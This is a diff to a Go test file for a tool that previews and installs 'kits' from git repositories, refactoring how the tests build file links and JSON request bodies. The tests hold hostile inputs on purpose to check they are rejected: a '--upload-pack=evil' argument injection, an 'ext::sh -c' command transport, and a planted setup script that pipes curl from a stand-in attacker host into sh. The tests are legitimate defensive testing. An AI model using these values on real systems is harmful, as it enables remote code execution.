@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"io"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -17,6 +18,8 @@ import (
 // kitRepo makes a git repository holding a kit in kits/cal.
 func kitRepo(t *testing.T, version string) string {
 	t.Helper()
+	t.Setenv("GIT_CONFIG_GLOBAL", os.DevNull)
+	t.Setenv("GIT_CONFIG_SYSTEM", os.DevNull)
 	repo := t.TempDir()
 	dir := filepath.Join(repo, "kits", "cal")
 	os.MkdirAll(filepath.Join(dir, "scripts"), 0o755)
@@ -31,6 +34,27 @@ func kitRepo(t *testing.T, version string) string {
 		}
 	}
 	return repo
+}
+
+func kitFileLink(repo, sub string) string {
+	path := filepath.ToSlash(repo)
+	if !strings.HasPrefix(path, "/") {
+		path = "/" + path
+	}
+	return (&url.URL{Scheme: "file", Path: path, Fragment: sub}).String()
+}
+
+func kitSourceBody(t *testing.T, src, hash string) string {
+	t.Helper()
+	fields := map[string]string{"src": src}
+	if hash != "" {
+		fields["hash"] = hash
+	}
+	b, err := json.Marshal(fields)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return string(b)
 }
 
 // allowFileKits lets a test fetch a kit from a folder's git repository,
@@ -57,16 +81,16 @@ func TestAKitIsFetchedFromALinkReviewedKeptAndApplied(t *testing.T) {
 	tok := uiToken(t, a)
 	eventually(t, "box online", func() bool { return stateOf(t, a) == StateOnline })
 	repo := kitRepo(t, "1.0.0")
-	src := "file://" + repo + "#kits/cal"
+	src := kitFileLink(repo, "kits/cal")
 
-	resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`)
+	resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, kitSourceBody(t, src, ""))
 	if resp.StatusCode != 200 || !strings.Contains(body, `"cal-dev"`) || !strings.Contains(body, "echo set up 1.0.0") {
 		t.Fatalf("preview: %d %s", resp.StatusCode, body)
 	}
 	if _, body := uiSend(t, a, "GET", "/v1/kits", tok, ""); strings.Contains(body, "cal-dev") {
 		t.Fatal("a preview kept the kit")
 	}
-	if resp, body := uiSend(t, a, "POST", "/v1/kits/add", tok, `{"src":"`+src+`"}`); resp.StatusCode != 200 {
+	if resp, body := uiSend(t, a, "POST", "/v1/kits/add", tok, kitSourceBody(t, src, "")); resp.StatusCode != 200 {
 		t.Fatalf("add: %d %s", resp.StatusCode, body)
 	}
 	_, body = uiSend(t, a, "GET", "/v1/kits", tok, "")
@@ -106,8 +130,8 @@ func TestKitLinksMustPointAtAKit(t *testing.T) {
 	a := startAgent(t, b.pairLaptop())
 	tok := uiToken(t, a)
 	empty := t.TempDir()
-	for _, src := range []string{"", "--upload-pack=evil", empty, "file://" + kitRepo(t, "1") + "#nope"} {
-		if resp, _ := uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`); resp.StatusCode != 400 {
+	for _, src := range []string{"", "--upload-pack=evil", empty, kitFileLink(kitRepo(t, "1"), "nope")} {
+		if resp, _ := uiSend(t, a, "POST", "/v1/kits/preview", tok, kitSourceBody(t, src, "")); resp.StatusCode != 400 {
 			t.Errorf("%q: %d, want 400", src, resp.StatusCode)
 		}
 	}
@@ -119,8 +143,8 @@ func TestKitLinksCannotUseLocalOrCommandTransports(t *testing.T) {
 	a := startAgent(t, b.pairLaptop())
 	tok := uiToken(t, a)
 	marker := filepath.Join(t.TempDir(), "ext-ran")
-	for _, src := range []string{"file://" + kitRepo(t, "1") + "#kits/cal", "ext::sh -c touch% " + marker} {
-		if resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`); resp.StatusCode != 400 {
+	for _, src := range []string{kitFileLink(kitRepo(t, "1"), "kits/cal"), "ext::sh -c touch% " + marker} {
+		if resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, kitSourceBody(t, src, "")); resp.StatusCode != 400 {
 			t.Errorf("%q: %d %s, want 400", src, resp.StatusCode, body)
 		}
 	}
@@ -138,27 +162,27 @@ func TestOnlyTheReviewedKitIsKeptAndApplied(t *testing.T) {
 	a := startAgent(t, b.pairLaptop())
 	tok := uiToken(t, a)
 	repo := kitRepo(t, "1.0.0")
-	src := "file://" + repo + "#kits/cal"
+	src := kitFileLink(repo, "kits/cal")
 
 	var preview struct{ Kit KitInfo }
-	resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`)
+	resp, body := uiSend(t, a, "POST", "/v1/kits/preview", tok, kitSourceBody(t, src, ""))
 	if resp.StatusCode != 200 || json.Unmarshal([]byte(body), &preview) != nil || preview.Kit.Hash == "" {
 		t.Fatalf("preview: %d %s", resp.StatusCode, body)
 	}
 	// The kit's owner pushes between the review and the click.
 	os.WriteFile(filepath.Join(repo, "kits", "cal", "scripts", "setup.sh"), []byte("#!/bin/sh\ncurl -s https://attacker.invalid/x | sh\n"), 0o755)
 	exec.Command("git", "-C", repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "evil").Run()
-	if resp, body := uiSend(t, a, "POST", "/v1/kits/add", tok, `{"src":"`+src+`","hash":"`+preview.Kit.Hash+`"}`); resp.StatusCode != 409 {
+	if resp, body := uiSend(t, a, "POST", "/v1/kits/add", tok, kitSourceBody(t, src, preview.Kit.Hash)); resp.StatusCode != 409 {
 		t.Fatalf("add after the source changed: %d %s, want 409", resp.StatusCode, body)
 	}
 	if _, body := uiSend(t, a, "GET", "/v1/kits", tok, ""); strings.Contains(body, "cal-dev") {
 		t.Fatalf("the changed kit was kept: %s", body)
 	}
 	// Reviewing again and adding what was shown works.
-	uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`)
-	_, body = uiSend(t, a, "POST", "/v1/kits/preview", tok, `{"src":"`+src+`"}`)
+	uiSend(t, a, "POST", "/v1/kits/preview", tok, kitSourceBody(t, src, ""))
+	_, body = uiSend(t, a, "POST", "/v1/kits/preview", tok, kitSourceBody(t, src, ""))
 	json.Unmarshal([]byte(body), &preview)
-	resp, body = uiSend(t, a, "POST", "/v1/kits/add", tok, `{"src":"`+src+`","hash":"`+preview.Kit.Hash+`"}`)
+	resp, body = uiSend(t, a, "POST", "/v1/kits/add", tok, kitSourceBody(t, src, preview.Kit.Hash))
 	if resp.StatusCode != 200 {
 		t.Fatalf("add of the reviewed kit: %d %s", resp.StatusCode, body)
 	}
